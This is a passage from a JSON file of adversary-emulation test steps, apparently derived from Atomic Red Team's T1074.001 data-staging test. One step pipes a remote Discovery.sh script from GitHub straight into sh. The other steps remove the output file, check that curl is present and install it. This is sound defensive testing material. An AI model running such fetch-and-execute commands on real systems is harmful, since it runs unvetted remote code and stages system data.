      "data": {
        "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s \u003e #{output_file}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "fac57e1e-2eef-4a9c-b52d-591baaed695e",
      "type": "execute-command",
      "data": {
        "command": "rm #{output_file}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "dda9f999-e2d0-4e5d-bd12-59ed2abe332b",
      "name": "Check dependency 1/1",
      "description": "Check if curl is installed on the machine.\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7d943c0f-6327-47e1-a71e-996d8578e57c",
      "name": "Resolve dependency 1/1",
      "description": "Check if curl is installed on the machine.\n",
      "type": "execute-command",
      "data": {
        "command": "which apt \u0026\u0026 apt update \u0026\u0026 apt install -y curl || which pkg \u0026\u0026 pkg update \u0026\u0026 pkg install -y curl\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
